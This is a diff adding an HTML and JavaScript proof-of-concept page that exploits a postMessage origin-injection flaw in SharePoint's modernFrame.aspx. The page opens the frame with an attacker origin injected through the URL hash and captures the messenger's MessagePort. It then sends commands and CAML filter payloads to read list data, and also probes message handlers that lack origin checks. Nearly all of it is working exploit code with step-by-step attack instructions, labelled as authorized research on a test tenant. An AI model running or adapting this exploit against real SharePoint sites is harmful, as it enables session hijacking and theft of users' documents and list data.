@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>SharePoint modernFrame.aspx - Messenger Origin Injection PoC</title>
+<style>
+body { font-family: monospace; padding: 20px; background: #1a1a2e; color: #0f0; }
+h1 { color: #e94560; font-size: 18px; }
+h2 { color: #e94560; font-size: 15px; }
+pre { background: #16213e; padding: 10px; border: 1px solid #0f3460; overflow: auto; max-height: 500px; font-size: 12px; }
+button { background: #e94560; color: white; border: none; padding: 8px 16px; cursor: pointer; margin: 3px; font-size: 13px; }
+button:hover { background: #c73e54; }
+input { width: 700px; background: #16213e; color: #0f0; border: 1px solid #0f3460; padding: 5px; font-size: 12px; }
+.section { margin: 15px 0; padding: 12px; border: 1px solid #0f3460; }
+.critical { color: #ff0000; font-weight: bold; }
+.success { color: #00ff00; font-weight: bold; }
+.info { color: #00bfff; }
+.warn { color: #ffaa00; }
+select { background: #16213e; color: #0f0; border: 1px solid #0f3460; padding: 5px; }
+</style>
+</head>
+<body>
+<h1>SharePoint modernFrame.aspx - Messenger Origin Injection PoC</h1>
+<p class="info">Authorized security research | Tenant: shiscolinotests.onmicrosoft.com</p>
+
+<div class="section">
+<h2>Vulnerability: Attacker-controlled targetOrigin in postMessage</h2>
+<p>modernFrame.aspx reads <code>origin</code> and <code>channelId</code> from URL hash fragment.
+These values are used as <code>targetOrigin</code> when sending postMessage to <code>window.opener</code>.
+An attacker page can <code>window.open()</code> the modernFrame with a crafted hash to receive sensitive data.</p>
+<pre>
+// modernframe.js - function g(a):
+function g(a) {
+  if (a.channelId && a.origin) return a;
+  let b = window.location.hash;  // &lt;-- reads from URL hash!
+  let c = {channelId:"", origin:""};
+  for (let a of b.slice(1).split("&amp;")) {
+    let [b,d] = a.split("=",3);
+    c.hasOwnProperty(b) &amp;&amp; (c[b] = decodeURIComponent(d));
+  }
+  return {...c, ...a};
+}
+
+// Then used as targetOrigin:
+let {origin: h = location.origin} = g(config);
+let m = window.parent !== window ? window.parent
+      : ("*" !== h ? window.opener : undefined);   // uses window.opener!
+m.postMessage({type:"initialize", channelId, replyTo:port}, h, [port]);
+//                                                          ^^^ attacker-controlled!
+</pre>
+</div>
+
+<div class="section">
+<h2>Step 1: Configure Target</h2>
+<p>SharePoint site URL:
+<input id="siteUrl" value="https://shiscolinotests.sharepoint.com/sites/POC_BAC_2"></p>
+<p>List URL (relative):
+<input id="listUrl" value="/sites/POC_BAC_2/Shared Documents"></p>
+<p>Attacker origin (this page):
+<input id="attackerOrigin" value="" readonly></p>
+</div>
+
+<div class="section">
+<h2>Step 2: Open modernFrame with injected origin</h2>
+<button onclick="openModernFrame('hash')">Attack via Hash Injection (#origin=attacker)</button>
+<button onclick="openModernFrame('queryparam')">Attack via Query Param (origin=attacker)</button>
+<button onclick="openModernFrame('identify')">Attack via identify-parent handshake</button>
+<span id="windowStatus" style="margin-left:10px;">Not opened</span>
+</div>
+
+<div class="section">
+<h2>Step 3: Interact with messenger (after receiving MessagePort)</h2>
+<button onclick="sendCommand('ready')">Check ready</button>
+<button onclick="sendCommand('navigate')">Send navigate command</button>
+<button onclick="sendCommand('update-view-params')">update-view-params</button>
+<button onclick="sendCommand('update-viewxml')">update-viewxml (CAML inject)</button>
+<button onclick="sendCommand('update-canvas-filter')">update-canvas-filter</button>
+<button onclick="sendCommand('pin-filter')">pin-filter</button>
+<button onclick="sendCommand('close')">close pane</button>
+<button onclick="sendCommand('reload')">reload</button>
+<button onclick="sendCommand('switchLayout')">switchLayout</button>
+<p style="margin-top:8px;">
+<button onclick="sendPostMessage('sharing-store')">Trigger SharingStoreReady (no origin check)</button>
+<button onclick="sendPostMessage('chat-pane')">Trigger chat-pane-ready (no origin check)</button>
+<button onclick="sendPostMessage('share-dismiss')">Trigger share_dismiss (no origin check)</button>
+</p>
+</div>
+
+<div class="section">
+<h2>Log</h2>
+<button onclick="clearLog()">Clear</button>
+<button onclick="downloadLog()">Download Log</button>
+<pre id="log"></pre>
+</div>
+
+<script>
+let targetWindow = null;
+let messengerPort = null;
+const CHANNEL_ID = 'attacker-' + Math.random().toString(36).substring(2, 10);
+
+function log(msg, cls) {
+    const el = document.getElementById('log');
+    const ts = new Date().toISOString().split('T')[1].split('.')[0];
+    el.textContent += ts + ' ' + msg + '\n';
+    el.scrollTop = el.scrollHeight;
+}
+
+// Set attacker origin
+document.getElementById('attackerOrigin').value = window.location.origin || 'file:// (local)';
+
+// Listen for ALL postMessages from any source
+window.addEventListener('message', function(event) {
+    const dataStr = typeof event.data === 'object' ? JSON.stringify(event.data) : String(event.data);
+    log('[RECV postMessage] origin=' + event.origin);
+    log('  data=' + dataStr.substring(0, 500));
+
+    // Check if this is the messenger initialization with a MessagePort
+    if (event.data && typeof event.data === 'object' && event.data.type === 'initialize') {
+        log('[!!!] MESSENGER INIT RECEIVED! channelId=' + event.data.channelId);
+
+        if (event.ports && event.ports.length > 0) {
+            messengerPort = event.ports[0];
+            messengerPort.onmessage = onPortMessage;
+            messengerPort.start();
+            log('[!!!] MessagePort CAPTURED - bidirectional channel established!');
+            log('[!!!] Can now send commands TO and receive data FROM modernFrame');
+
+            // Send activate to complete handshake
+            messengerPort.postMessage({type: 'activate'});
+            log('[SEND via port] {type: "activate"} - completing handshake');
+        }
+    }
+
+    // Check for other message types
+    if (event.data && typeof event.data === 'object') {
+        if (event.data.type === 'identify-parent') {
+            log('[INFO] identify-parent received, channelId=' + event.data.channelId);
+        }
+    }
+
+    // Check for transferred ports on any message
+    if (event.ports && event.ports.length > 0 && !messengerPort) {
+        messengerPort = event.ports[0];
+        messengerPort.onmessage = onPortMessage;
+        messengerPort.start();
+        log('[!!!] MessagePort received via transfer!');
+    }
+});
+
+function onPortMessage(event) {
+    const dataStr = typeof event.data === 'object' ? JSON.stringify(event.data) : String(event.data);
+    log('[PORT-RECV] ' + dataStr.substring(0, 800));
+
+    // Interesting data to flag
+    if (event.data) {
+        const d = event.data;
+        if (d.type === 'command') {
+            log('[PORT-CMD] command data: ' + JSON.stringify(d.data).substring(0, 500));
+        }
+        if (d.type === 'notification') {
+            log('[PORT-NOTIF] ' + JSON.stringify(d.data).substring(0, 500));
+        }
+        if (d.type === 'result') {
+            log('[PORT-RESULT] id=' + d.id + ' data=' + JSON.stringify(d.data).substring(0, 500));
+        }
+    }
+}
+
+function openModernFrame(method) {
+    const siteUrl = document.getElementById('siteUrl').value;
+    const listUrl = document.getElementById('listUrl').value;
+    const attackerOrigin = window.location.origin;
+
+    let url;
+
+    if (method === 'hash') {
+        // Method 1: Inject origin via URL hash
+        url = siteUrl + '/_layouts/15/modernFrame.aspx'
+            + '?parent=' + encodeURIComponent(listUrl)
+            + '&listUrl=' + encodeURIComponent(listUrl)
+            + '&scenario=detailsPane'
+            + '&component=detailsPane'
+            + '&app=OneUp'
+            + '#channelId=' + CHANNEL_ID
+            + '&origin=' + encodeURIComponent(attackerOrigin);
+
+        log('[ATTACK] Method: Hash injection');
+        log('[ATTACK] channelId=' + CHANNEL_ID);
+        log('[ATTACK] origin=' + attackerOrigin + ' (injected via hash)');
+
+    } else if (method === 'queryparam') {
+        // Method 2: Try via query param
+        url = siteUrl + '/_layouts/15/modernFrame.aspx'
+            + '?origin=' + encodeURIComponent(attackerOrigin)
+            + '&parent=' + encodeURIComponent(listUrl)
+            + '&listUrl=' + encodeURIComponent(listUrl)
+            + '&scenario=detailsPane'
+            + '&channelId=' + CHANNEL_ID
+            + '&component=detailsPane'
+            + '&app=OneUp';
+
+        log('[ATTACK] Method: Query param injection');
+
+    } else if (method === 'identify') {
+        // Method 3: Open without hash, then send identify-parent message
+        url = siteUrl + '/_layouts/15/modernFrame.aspx'
+            + '?parent=' + encodeURIComponent(listUrl)
+            + '&listUrl=' + encodeURIComponent(listUrl)
+            + '&scenario=detailsPane'
+            + '&component=detailsPane'
+            + '&app=OneUp'
+            + '#channelId=' + CHANNEL_ID
+            + '&origin=' + encodeURIComponent(attackerOrigin);
+
+        log('[ATTACK] Method: identify-parent handshake');
+        log('[ATTACK] Will send identify-parent after page loads');
+    }
+
+    log('[OPEN] ' + url);
+    targetWindow = window.open(url, 'spModernFrame', 'width=500,height=700');
+
+    if (!targetWindow) {
+        document.getElementById('windowStatus').textContent = 'BLOCKED - allow popups!';
+        log('[ERROR] Popup blocked by browser');
+        return;
+    }
+    document.getElementById('windowStatus').textContent = 'Window opened!';
+
+    if (method === 'identify') {
+        // Wait for page to load, then send identify-parent
+        setTimeout(function() {
+            log('[SEND] identify-parent handshake with channelId=' + CHANNEL_ID);
+            targetWindow.postMessage({
+                type: 'identify-parent',
+                channelId: CHANNEL_ID
+            }, '*');
+        }, 5000);
+    }
+}
+
+function sendCommand(cmd) {
+    if (messengerPort) {
+        // Send via MessagePort (bidirectional channel)
+        let payload;
+        const cmdId = 'cmd-' + Date.now();
+
+        switch(cmd) {
+            case 'navigate':
+                payload = {type:'command', id: cmdId, data:{command:'navigate', options:{url:'/sites/POC_BAC_2'}}};
+                break;
+            case 'update-view-params':
+                payload = {type:'command', id: cmdId, data:{command:'update-view-params', viewParams:{test:'injected'}}};
+                break;
+            case 'update-viewxml':
+                // CAML injection via viewxml command
+                payload = {type:'command', id: cmdId, data:{command:'update-viewxml', options:'<Where><Eq><FieldRef Name="ID"/><Value Type="Number">1</Value></Eq></Where>'}};
+                break;
+            case 'update-canvas-filter':
+                payload = {type:'command', id: cmdId, data:{command:'update-canvas-filter', options:{filterParams:'injected', camlFilter:'<Where><IsNotNull><FieldRef Name="Title"/></IsNotNull></Where>'}}};
+                break;
+            case 'pin-filter':
+                payload = {type:'command', id: cmdId, data:{command:'pin-filter', options:{fieldName:'Title', showInFiltersPane:true}}};
+                break;
+            case 'close':
+                payload = {type:'command', id: cmdId, data:{command:'close'}};
+                break;
+            case 'reload':
+                payload = {type:'command', id: cmdId, data:{command:'reload'}};
+                break;
+            case 'switchLayout':
+                payload = {type:'command', id: cmdId, data:{command:'switchLayout', layout:'list'}};
+                break;
+            default:
+                payload = {type:'command', id: cmdId, data:{command:cmd}};
+        }
+
+        messengerPort.postMessage(payload);
+        log('[PORT-SEND] ' + JSON.stringify(payload).substring(0, 300));
+    } else if (targetWindow) {
+        // No port yet - try direct postMessage
+        log('[WARN] No MessagePort yet - trying direct postMessage');
+        targetWindow.postMessage({type: cmd, channelId: CHANNEL_ID}, '*');
+    } else {
+        log('[ERROR] Open modernFrame first');
+    }
+}
+
+function sendPostMessage(type) {
+    if (!targetWindow) { log('[ERROR] Open target first'); return; }
+
+    let payload;
+    switch(type) {
+        case 'sharing-store':
+            // SharingStoreReady handler - NO origin check!
+            payload = JSON.stringify({name: 'SharingStoreReady'});
+            break;
+        case 'chat-pane':
+            // chat-pane-ready handler - NO origin check!
+            payload = {type: 'chat-pane-ready'};
+            break;
+        case 'share-dismiss':
+            // share_dismiss handler - NO origin check!
+            payload = JSON.stringify({name: 'share_dismiss'});
+            break;
+    }
+
+    targetWindow.postMessage(payload, '*');
+    log('[SEND-PM] ' + (typeof payload === 'string' ? payload : JSON.stringify(payload)));
+    log('[INFO] This handler has NO event.origin validation!');
+}
+
+function clearLog() { document.getElementById('log').textContent = ''; }
+
+function downloadLog() {
+    const text = document.getElementById('log').textContent;
+    const blob = new Blob([text], {type: 'text/plain'});
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = 'modernframe_poc_log.txt';
+    a.click();
+}
+
+log('[READY] modernFrame Messenger Origin Injection PoC');
+log('[INFO] Attacker origin: ' + (window.location.origin || 'file://'));
+log('[INFO] Generated channelId: ' + CHANNEL_ID);
+log('');
+log('[THEORY] Attack flow:');
+log('  1. Attacker opens modernFrame.aspx#channelId=X&origin=https://attacker.com');
+log('  2. modernFrame reads origin from hash, uses as targetOrigin');
+log('  3. Messenger sends {type:"initialize"} + MessagePort to window.opener');
+log('  4. Attacker receives port, can send commands and receive data');
+log('  5. Attacker sends update-viewxml/update-canvas-filter via port');
+log('  6. modernFrame processes commands and returns list data');
+log('');
+log('[STEP 1] Click "Attack via Hash Injection" (allow popups)');
+log('[STEP 2] Wait for modernFrame to load (~5s)');
+log('[STEP 3] Watch for "[!!!] MESSENGER INIT RECEIVED" in log');
+log('[STEP 4] If port captured, use command buttons to interact');
+</script>
+</body>
+</html>
